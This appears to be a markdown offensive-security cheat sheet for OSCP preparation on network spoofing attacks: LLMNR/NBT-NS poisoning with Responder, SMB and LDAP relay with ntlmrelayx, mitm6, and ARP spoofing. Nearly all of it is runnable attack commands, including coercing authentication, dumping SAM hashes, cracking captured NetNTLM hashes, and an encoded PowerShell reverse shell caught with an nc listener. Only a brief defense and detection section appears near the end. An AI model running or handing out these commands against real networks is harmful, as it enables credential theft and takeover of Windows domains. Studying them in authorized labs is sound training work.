# Network Spoofing Attacks Guide (Responder, SMB Relay, mDNS)

## Table of Contents
1. [LLMNR/NBT-NS Poisoning](#llmnrnbt-ns-poisoning)
2. [Responder Deep Dive](#responder-deep-dive)
3. [SMB Relay Attacks](#smb-relay-attacks)
4. [mDNS/MDNS Poisoning](#mdnsmdns-poisoning)
5. [IPv6 Attacks (mitm6)](#ipv6-attacks-mitm6)
6. [ARP Spoofing](#arp-spoofing)
7. [OSCP Scenarios](#oscp-scenarios)

---

## LLMNR/NBT-NS Poisoning

### Concept
When DNS fails, Windows uses LLMNR/NBT-NS to resolve names. Attacker poisons these requests to capture NetNTLMv2 hashes.

### Attack Flow
```
1. User tries to access \\fileserver\share
2. DNS lookup fails
3. Windows broadcasts LLMNR/NBT-NS request
4. Attacker responds "I am fileserver!"
5. User sends NetNTLMv2 hash to authenticate
6. Attacker captures hash
7. Crack hash offline
```

---

## Responder Deep Dive

### Basic Usage

#### Start Responder
```bash
# Standard mode (poison all)
sudo responder -I eth0 -wv

# Analyze mode (listen only, no poisoning)
sudo responder -I eth0 -A

# Force WPAD
sudo responder -I eth0 -wFv

# Verbose with file server
sudo responder -I eth0 -wvf
```

#### Options
```
-I  : Network interface
-w  : Start WPAD rogue proxy
-v  : Verbose
-F  : Force WPAD auth
-f  : Fingerprint hosts
-A  : Analyze mode (passive)
```

### Configuration

#### Edit Responder.conf
```bash
sudo nano /usr/share/responder/Responder.conf
```

**Common Changes:**
```ini
[Responder Core]
SMB = On/Off      # Disable for SMB relay
HTTP = On/Off     # Disable for HTTP relay
SSL = On          # HTTPS poisoning
SQL = On          # MSSQL poisoning

[HTTP Server]
# Serve files
Serve-Html = On
HtmlToServe = custom.html
```

### Captured Hashes

#### Location
```bash
/usr/share/responder/logs/
```

#### Hash Formats
```
NetNTLMv1: username::domain:challenge:response
NetNTLMv2: username::domain:challenge:blob:response
```

#### Crack with Hashcat
```bash
# NetNTLMv2
hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv1
hashcat -m 5500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## SMB Relay Attacks

### Concept
Instead of capturing and cracking hashes, relay them to authenticate to other machines.

### Requirements
- SMB signing disabled on target
- Captured credentials have admin rights on target

### Check SMB Signing

#### CrackMapExec
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
```

#### Nmap
```bash
nmap --script smb-security-mode -p445 192.168.1.0/24
```

### Attack Steps

#### 1. Disable SMB/HTTP in Responder
```bash
sudo nano /usr/share/responder/Responder.conf

# Set:
SMB = Off
HTTP = Off
```

#### 2. Start Responder
```bash
sudo responder -I eth0 -v
```

#### 3. Start ntlmrelayx (different terminal)
```bash
# Basic relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# With command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Dump SAM
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# SOCKS proxy
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```

#### 4. Coerce Authentication

**Force Authentication:**
```bash
# PrinterBug
python3 printerbug.py domain/user:pass@victim-ip attacker-ip

# PetitPotam
python3 PetitPotam.py attacker-ip victim-ip

# Manual (user clicks link)
\\attacker-ip\share
```

### Advanced SMB Relay

#### Relay to Specific User
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support --delegate-access
```

#### Relay with LDAP
```bash
# Relay to LDAP (add user to group)
impacket-ntlmrelayx -t ldap://dc-ip --escalate-user lowpriv-user
```

#### Relay with SOCKS
```bash
# Start relay with SOCKS
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Use SOCKS proxy
proxychains crackmapexec smb 192.168.1.10 -u Administrator -p ''
proxychains secretsdump.py domain/Administrator@192.168.1.10
```

### MultiRelay (Metasploit)

```bash
use auxiliary/server/capture/smb
set JOHNPWFILE /tmp/hashes.txt
run

# Relay module
use exploit/windows/smb/smb_relay
set SMBHOST target-ip
exploit
```

---

## mDNS/MDNS Poisoning

### Concept
Similar to LLMNR but for .local domains (common on macOS/Linux networks).

### Tools

#### Responder (includes mDNS)
```bash
sudo responder -I eth0 -v
```

#### Evil-SSDP
```bash
# SSDP/UPnP poisoning
python3 evil-ssdp.py eth0
```

---

## IPv6 Attacks (mitm6)

### Concept
Many Windows networks don't use IPv6 but have it enabled. Attacker becomes IPv6 DNS server via DHCPv6.

### mitm6 + ntlmrelayx

#### 1. Start mitm6
```bash
# Advertise attacker as IPv6 DNS
sudo mitm6 -d domain.local
```

#### 2. Start ntlmrelayx
```bash
# Relay to LDAP
impacket-ntlmrelayx -6 -t ldaps://dc-ip -wh attacker-wpad.domain.local -l loot

# Create new domain admin (if victim is DA)
impacket-ntlmrelayx -6 -t ldaps://dc-ip -wh attacker-wpad.domain.local --delegate-access
```

#### 3. Wait for Authentication
When users/machines authenticate, hashes are relayed to DC via LDAP.

---

## ARP Spoofing

### Concept
Intercept traffic between two hosts by poisoning ARP cache.

### Tools

#### arpspoof (dsniff)
```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Spoof victim that we are gateway
sudo arpspoof -i eth0 -t victim-ip gateway-ip

# Spoof gateway that we are victim (different terminal)
sudo arpspoof -i eth0 -t gateway-ip victim-ip

# Capture traffic
sudo tcpdump -i eth0 -w capture.pcap
```

#### Ettercap
```bash
# Unified sniffing
sudo ettercap -T -M arp:remote /victim-ip// /gateway-ip//

# With GUI
sudo ettercap -G
```

#### Bettercap
```bash
# Start bettercap
sudo bettercap -iface eth0

# ARP spoof
set arp.spoof.targets victim-ip
arp.spoof on

# Sniff credentials
set net.sniff.local true
net.sniff on
```

---

## OSCP Scenarios

### Scenario 1: Responder to Hash Crack
```bash
# 1. Start Responder
sudo responder -I eth0 -wv

# 2. Wait for hashes (or trigger with link)
# Captured: user::DOMAIN:challenge:response

# 3. Crack
hashcat -m 5600 -a 0 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.10.txt /usr/share/wordlists/rockyou.txt

# 4. Use credentials
crackmapexec smb 192.168.1.0/24 -u user -p 'cracked_password'
evil-winrm -i 192.168.1.10 -u user -p 'cracked_password'
```

### Scenario 2: SMB Relay to Shell
```bash
# 1. Find targets without SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# 2. Disable SMB in Responder.conf
sudo nano /usr/share/responder/Responder.conf
# SMB = Off

# 3. Start Responder
sudo responder -I eth0 -v

# 4. Start ntlmrelayx with command
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64_reverse_shell>"

# 5. Start listener
nc -nlvp 443

# 6. Trigger authentication (user browses to \\attacker-ip\share)

# 7. Receive shell
```

### Scenario 3: mitm6 + Relay to LDAP
```bash
# 1. Start mitm6
sudo mitm6 -d domain.local

# 2. Start ntlmrelayx to LDAP
impacket-ntlmrelayx -6 -t ldaps://dc.domain.local -wh attacker-wpad.domain.local -l loot

# 3. Wait for machine/user authentication

# 4. Check loot directory for dumped info
ls loot/
cat loot/domain_computers.html
```

### Scenario 4: ARP Spoof to Credential Capture
```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Start ARP spoof
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# 3. Capture traffic (new terminal)
sudo tcpdump -i eth0 -w capture.pcap

# 4. Analyze with Wireshark
wireshark capture.pcap

# Look for:
# - HTTP credentials
# - FTP credentials
# - Clear text passwords
```

---

## Defense Detection (For Understanding)

### Signs of Poisoning Attack
```
- Duplicate MAC addresses
- ARP cache inconsistencies
- Unexpected authentication requests
- LLMNR/NBT-NS responses from unknown hosts
```

### Prevention
```
- Disable LLMNR/NBT-NS (Group Policy)
- Enable SMB signing (required)
- Use static ARP entries
- Network segmentation
- Monitor for ARP spoofing
```

---

## Tools Quick Reference

### Responder
```bash
sudo responder -I eth0 -wv      # Standard
sudo responder -I eth0 -A       # Analyze only
```

### ntlmrelayx
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "cmd"
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # Interactive
```

### mitm6
```bash
sudo mitm6 -d domain.local
```

### ARP Spoof
```bash
sudo arpspoof -i eth0 -t victim gateway
```

### CrackMapExec (find relay targets)
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
```

---

**Remember**: Network poisoning attacks are passive but very effective. Responder + ntlmrelayx is common in OSCP!
